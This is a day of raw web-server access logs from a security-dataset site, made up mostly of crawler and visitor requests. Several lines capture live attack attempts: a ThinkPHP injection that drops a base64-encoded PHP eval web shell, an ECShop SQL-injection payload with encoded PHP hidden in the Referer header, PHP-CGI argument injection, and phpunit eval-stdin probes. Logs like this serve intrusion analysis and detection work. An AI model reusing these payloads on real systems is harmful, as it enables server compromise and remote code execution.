14.18.107.89 - - [27/Jul/2023:02:45:17 -0700] "GET //zb_system/login.php HTTP/1.1" 404 328 "-" "python-requests/2.27.1" 
107.189.12.105 - - [27/Jul/2023:10:23:43 -0700] "GET //?a=fetch&templateFile=public/index&prefix=''&content=<php>file_put_contents('nuan.php',base64_decode('PD9waHAgQGV2YWwoJF9QT1NUWydobTE0NzI1OCddKTs/Pg=='));</php> HTTP/1.1" 200 49110 "http://www.secrepo.com//?a=fetch&templateFile=public/index&prefix=''&content=<php>file_put_contents('nuan.php',base64_decode('PD9waHAgQGV2YWwoJF9QT1NUWydobTE0NzI1OCddKTs/Pg=='));</php>" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
107.189.12.105 - - [27/Jul/2023:10:23:43 -0700] "POST //nuan.php HTTP/1.1" 404 305 "http://www.secrepo.com//nuan.php" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
107.189.12.105 - - [27/Jul/2023:10:23:43 -0700] "GET //install/index.php.bak?step=11&insLockfile=a&s_lang=a&install_demo_name=../data/admin/config_update.php HTTP/1.1" 418 746 "http://www.secrepo.com//install/index.php.bak?step=11&insLockfile=a&s_lang=a&install_demo_name=../data/admin/config_update.php" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
107.189.12.105 - - [27/Jul/2023:10:23:44 -0700] "GET //user.php?act=login HTTP/1.1" 404 305 "45ea207d7a2b68c49582d2d22adf953aads|a:2:{s:3:\"num\";s:297:\"*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275D3B617373657274286261736536345F6465636F646528275A6D6C735A56397764585266593239756447567564484D6F4A336C7A655846784C6E426F634363734A7A772F63476877494756325957776F4A46395154314E5557336C7A655630704F79412F506963702729293B2F2F7D787878,10-- -\";s:2:\"id\";s:11:\"-1' UNION/*\";}45ea207d7a2b68c49582d2d22adf953a" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
107.189.12.105 - - [27/Jul/2023:10:23:44 -0700] "POST //?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input HTTP/1.1" 418 746 "http://www.secrepo.com//?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
107.189.12.105 - - [27/Jul/2023:10:23:44 -0700] "POST //vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 418 746 "http://www.secrepo.com//vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
107.189.12.105 - - [27/Jul/2023:10:23:44 -0700] "POST //yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 418 746 "http://www.secrepo.com//yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
107.189.12.105 - - [27/Jul/2023:10:23:44 -0700] "POST //laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 418 746 "http://www.secrepo.com//laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
107.189.12.105 - - [27/Jul/2023:10:23:44 -0700] "POST //laravel52/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 418 746 "http://www.secrepo.com//laravel52/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
107.189.12.105 - - [27/Jul/2023:10:23:44 -0700] "POST //lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 418 746 "http://www.secrepo.com//lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
107.189.12.105 - - [27/Jul/2023:10:23:44 -0700] "POST //zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 418 746 "http://www.secrepo.com//zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
107.189.12.105 - - [27/Jul/2023:10:23:44 -0700] "POST //include/dialog/select_images_post.php HTTP/1.1" 404 305 "http://www.secrepo.com//include/dialog/select_images_post.php" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
114.119.156.172 - - [27/Jul/2023:10:23:56 -0700] "GET /self.logs/error.log.2020-04-18 HTTP/1.1" 200 351 "http://www.secrepo.com/self.logs?C=N%3BO%3DD" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
194.169.175.92 - - [27/Jul/2023:10:25:40 -0700] "GET /wp-content/plugins/ninja-forms/assets/css/nf-form-block-style.css HTTP/1.1" 301 605 "www.google.com" "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36" 
194.169.175.92 - - [27/Jul/2023:10:25:47 -0700] "GET /wp-content/plugins/ninja-forms/assets/css/nf-form-block-style.css HTTP/1.1" 429 486 "www.google.com" "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36" 
114.119.148.155 - - [27/Jul/2023:10:26:11 -0700] "GET /self.logs/error.log.2020-01-13 HTTP/1.1" 200 351 "http://www.secrepo.com/self.logs?C=N%3BO%3DD" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
3.238.73.165 - - [27/Jul/2023:10:43:44 -0700] "GET / HTTP/1.1" 200 13142 "-" "Mozilla/5.0 (compatible; startmebot/1.0; +https://start.me/bot)" 
49.7.20.89 - - [27/Jul/2023:10:55:52 -0700] "GET / HTTP/1.1" 200 13149 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
114.119.150.249 - - [27/Jul/2023:11:16:36 -0700] "GET /self.logs/error.log.2020-11-10 HTTP/1.1" 200 351 "http://www.secrepo.com/self.logs?C=N%3BO%3DD" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
95.10.205.128 - - [27/Jul/2023:11:31:37 -0700] "GET /maccdc2012/http.log.gz HTTP/1.1" 200 56420988 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36" 
40.88.21.235 - - [27/Jul/2023:11:32:24 -0700] "GET / HTTP/1.1" 200 13186 "http://www.secrepo.com/" "Mozilla/5.0 (compatible; DuckDuckGo-Favicons-Bot/1.0; +http://duckduckgo.com)" 
40.88.21.235 - - [27/Jul/2023:11:32:24 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 690 "http://www.secrepo.com/bootstrap/img/favicon.ico" "Mozilla/5.0 (compatible; DuckDuckGo-Favicons-Bot/1.0; +http://duckduckgo.com)" 
165.22.187.91 - - [27/Jul/2023:11:41:16 -0700] "GET /wp-login.php HTTP/1.1" 403 117 "-" "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/95.0" 
49.7.20.89 - - [27/Jul/2023:11:45:43 -0700] "GET / HTTP/1.1" 200 13149 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
58.250.125.111 - - [27/Jul/2023:11:48:25 -0700] "GET / HTTP/1.1" 200 13149 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
212.6.86.197 - - [27/Jul/2023:12:00:05 -0700] "GET / HTTP/1.1" 200 13149 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36" 
212.6.86.197 - - [27/Jul/2023:12:00:07 -0700] "GET /css/style.css HTTP/1.1" 404 291 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36" 
212.6.86.197 - - [27/Jul/2023:12:00:07 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7519 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36" 
212.6.86.197 - - [27/Jul/2023:12:00:09 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27879 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36" 
128.195.181.211 - - [27/Jul/2023:12:11:17 -0700] "GET / HTTP/1.1" 200 13186 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36" 
128.195.181.211 - - [27/Jul/2023:12:11:17 -0700] "GET /css/style.css HTTP/1.1" 404 305 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36" 
128.195.181.211 - - [27/Jul/2023:12:11:17 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27916 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36" 
128.195.181.211 - - [27/Jul/2023:12:11:17 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7556 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36" 
128.195.181.211 - - [27/Jul/2023:12:11:19 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 690 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36" 
103.131.71.166 - - [27/Jul/2023:12:16:02 -0700] "GET /robots.txt HTTP/1.1" 200 340 "-" "Mozilla/5.0 (compatible; coccocbot-web/1.0; +http://help.coccoc.com/searchengine)" 
38.55.216.40 - - [27/Jul/2023:12:24:51 -0700] "GET / HTTP/1.1" 429 430 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1" 
38.55.216.40 - - [27/Jul/2023:12:24:57 -0700] "GET / HTTP/1.1" 301 419 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1" 
38.55.216.40 - - [27/Jul/2023:12:24:57 -0700] "GET / HTTP/1.1" 301 419 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1" 
38.55.216.40 - - [27/Jul/2023:12:24:58 -0700] "GET / HTTP/1.1" 429 430 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1" 
38.55.216.40 - - [27/Jul/2023:12:24:59 -0700] "GET / HTTP/1.1" 429 430 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1" 
106.227.34.64 - - [27/Jul/2023:12:30:05 -0700] "GET /manage/FCKeditor/fckconfig.js HTTP/1.1" 404 328 "http://www.secrepo.com/manage/FCKeditor/fckconfig.js" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)" 
49.7.20.89 - - [27/Jul/2023:12:33:39 -0700] "GET / HTTP/1.1" 200 13149 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
124.248.69.164 - - [27/Jul/2023:12:35:26 -0700] "GET /admin.php HTTP/1.1" 404 328 "-" "python-requests/2.31.0" 
124.248.69.116 - - [27/Jul/2023:12:44:28 -0700] "GET /secrepologin.php?s=Admin/login HTTP/1.1" 404 328 "-" "python-requests/2.31.0" 
73.251.28.242 - - [27/Jul/2023:12:55:59 -0700] "GET / HTTP/1.1" 200 13186 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36" 
73.251.28.242 - - [27/Jul/2023:12:55:59 -0700] "GET /css/style.css HTTP/1.1" 404 305 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36" 
73.251.28.242 - - [27/Jul/2023:12:55:59 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27893 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36" 
73.251.28.242 - - [27/Jul/2023:12:55:59 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7533 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36" 
73.251.28.242 - - [27/Jul/2023:12:56:00 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 690 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36" 
73.251.28.242 - - [27/Jul/2023:13:02:12 -0700] "GET /css/style.css HTTP/1.1" 404 328 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36" 
89.149.202.135 - - [27/Jul/2023:13:07:23 -0700] "GET / HTTP/1.1" 200 13142 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36" 
49.7.20.89 - - [27/Jul/2023:13:19:33 -0700] "GET / HTTP/1.1" 200 13149 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
207.46.13.214 - - [27/Jul/2023:13:27:14 -0700] "GET /Datasets%20Description/HTML_Bro_log_3/?C=M;O=A HTTP/1.1" 200 823 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36" 
27.124.45.54 - - [27/Jul/2023:13:36:55 -0700] "GET /index.php?m=admin&c=index&a=login HTTP/1.1" 404 328 "-" "python-requests/2.24.0" 
49.7.20.89 - - [27/Jul/2023:14:03:02 -0700] "GET / HTTP/1.1" 200 13149 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
156.245.20.192 - - [27/Jul/2023:14:16:00 -0700] "GET / HTTP/1.1" 301 438 "-" "Go-http-client/1.1" 
156.245.20.192 - - [27/Jul/2023:14:16:02 -0700] "GET / HTTP/1.1" 200 13149 "http://secrepo.com" "Go-http-client/1.1" 
124.248.69.66 - - [27/Jul/2023:14:21:33 -0700] "GET /include/ckeditor/plugins/smiley/images/angel_smile.gif HTTP/1.1" 404 328 "http://www.secrepo.com/include/ckeditor/plugins/smiley/images/angel_smile.gif" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36" 
124.248.69.66 - - [27/Jul/2023:14:21:34 -0700] "GET /plus/ad_js.php HTTP/1.1" 404 328 "http://www.secrepo.com/plus/ad_js.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36" 
124.248.69.66 - - [27/Jul/2023:14:21:35 -0700] "GET /plus/flink_add.php HTTP/1.1" 404 328 "http://www.secrepo.com/plus/flink_add.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36" 
54.36.149.8 - - [27/Jul/2023:14:30:51 -0700] "GET /robots.txt HTTP/1.1" 200 333 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" 
51.222.253.14 - - [27/Jul/2023:14:30:53 -0700] "GET / HTTP/1.1" 200 13142 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" 
213.111.121.75 - - [27/Jul/2023:14:34:28 -0700] "GET / HTTP/1.1" 200 13186 "-" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36" 
213.111.121.75 - - [27/Jul/2023:14:34:29 -0700] "GET /css/style.css HTTP/1.1" 404 305 "http://www.secrepo.com/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36" 
213.111.121.75 - - [27/Jul/2023:14:34:29 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27893 "http://www.secrepo.com/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36" 
213.111.121.75 - - [27/Jul/2023:14:34:30 -0700] "GET /GitHub-Mark.png HTTP/1.1" 304 271 "http://www.secrepo.com/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36" 
207.46.13.214 - - [27/Jul/2023:14:41:00 -0700] "GET /honeypot/honeypot%20-%20howto.pdf HTTP/1.1" 404 328 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36" 
114.119.146.244 - - [27/Jul/2023:14:41:02 -0700] "GET /self.logs/error.log.2020-12-17 HTTP/1.1" 200 351 "http://www.secrepo.com/self.logs?C=N%3BO%3DD" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
49.7.20.89 - - [27/Jul/2023:14:44:32 -0700] "GET / HTTP/1.1" 200 13149 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
66.249.66.195 - - [27/Jul/2023:14:46:40 -0700] "GET /self.logs/error.log.2023-07-16 HTTP/1.1" 200 351 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.179 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
103.230.15.185 - - [27/Jul/2023:14:48:22 -0700] "GET /ue/net/controller.ashx?action=catchimage HTTP/1.1" 404 328 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0" 
140.210.18.229 - - [27/Jul/2023:14:51:53 -0700] "GET /zb_system/login.php HTTP/1.1" 404 328 "-" "python-requests/2.24.0" 
200.40.195.130 - - [27/Jul/2023:14:56:54 -0700] "GET /Security-Data-Analysis/Lab_1/conn.log.zip HTTP/1.1" 200 78660 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0" 
200.40.195.130 - - [27/Jul/2023:14:57:10 -0700] "GET /Security-Data-Analysis/Lab_1/conn.log.zip HTTP/1.1" 200 75900 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0" 
200.40.195.130 - - [27/Jul/2023:14:58:11 -0700] "GET /Security-Data-Analysis/Lab_1/conn.log.zip HTTP/1.1" 200 17927580 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0" 
200.40.195.130 - - [27/Jul/2023:14:56:59 -0700] "GET /Security-Data-Analysis/Lab_1/conn.log.zip HTTP/1.1" 200 547221542 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0" 
206.47.249.246 - - [27/Jul/2023:15:09:51 -0700] "GET /self.logs/error.log.2019-04-23.gz HTTP/1.1" 304 280 "-" "Mozilla/4.0 (compatible;)" 
211.149.175.131 - - [27/Jul/2023:15:10:42 -0700] "GET /admin/kindeditor/themes/default/default.css HTTP/1.1" 404 328 "http://www.secrepo.com/admin/kindeditor/themes/default/default.css" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)" 
104.28.60.223 - - [27/Jul/2023:15:12:55 -0700] "GET / HTTP/1.1" 200 13186 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5.2 Mobile/15E148 Safari/604.1" 
104.28.60.223 - - [27/Jul/2023:15:12:55 -0700] "GET /css/style.css HTTP/1.1" 404 328 "http://www.secrepo.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5.2 Mobile/15E148 Safari/604.1" 
104.28.60.223 - - [27/Jul/2023:15:12:55 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7533 "http://www.secrepo.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5.2 Mobile/15E148 Safari/604.1" 
104.28.60.223 - - [27/Jul/2023:15:12:55 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27916 "http://www.secrepo.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5.2 Mobile/15E148 Safari/604.1" 
34.66.192.188 - - [27/Jul/2023:15:15:34 -0700] "HEAD /honeypot/Honeypot%20-%20Howto%20-%20BSides%20Austin.pdf HTTP/1.1" 429 191 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36" 
107.189.13.184 - - [27/Jul/2023:15:23:45 -0700] "GET /wp-content/plugins/woocommerce/readme.txt HTTP/1.1" 301 501 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.17 Safari/537.36" 
107.189.13.184 - - [27/Jul/2023:15:23:46 -0700] "GET /wp-content/plugins/woocommerce/readme.txt HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.17 Safari/537.36" 
49.7.20.89 - - [27/Jul/2023:15:25:14 -0700] "GET / HTTP/1.1" 200 13149 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
124.248.69.211 - - [27/Jul/2023:16:01:09 -0700] "GET /e/DownSys/play/images/top_l.gif HTTP/1.1" 404 328 "http://www.secrepo.com/e/DownSys/play/images/top_l.gif" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36" 
124.248.69.211 - - [27/Jul/2023:16:01:10 -0700] "GET /d/txt/test.txt HTTP/1.1" 404 328 "http://www.secrepo.com/d/txt/test.txt" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36" 
124.248.69.211 - - [27/Jul/2023:16:01:11 -0700] "GET /d/js/acmsd/close_o.gif HTTP/1.1" 404 328 "http://www.secrepo.com/d/js/acmsd/close_o.gif" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36" 
124.248.69.211 - - [27/Jul/2023:16:01:18 -0700] "GET /e/DoInfo/AddInfo.php HTTP/1.1" 404 328 "http://www.secrepo.com/e/DoInfo/AddInfo.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36" 
49.7.20.89 - - [27/Jul/2023:16:05:35 -0700] "GET / HTTP/1.1" 200 13148 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
114.119.154.26 - - [27/Jul/2023:16:10:15 -0700] "GET /Datasets%20Description HTTP/1.1" 301 589 "http://www.secrepo.com/Datasets%20Description/Network?C=N%3BO%3DD" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
114.119.154.26 - - [27/Jul/2023:16:10:22 -0700] "GET /Datasets%20Description/ HTTP/1.1" 200 677 "http://www.secrepo.com/Datasets%20Description/Network?C=N%3BO%3DD" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
49.7.20.89 - - [27/Jul/2023:16:44:49 -0700] "GET / HTTP/1.1" 200 13149 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
135.181.100.144 - - [27/Jul/2023:16:48:14 -0700] "GET /robots.txt HTTP/1.1" 200 340 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6" 
61.147.93.228 - - [27/Jul/2023:17:02:30 -0700] "GET / HTTP/1.1" 200 13186 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4280.67 Safari/537.36 Edg/97.0.664.52" 
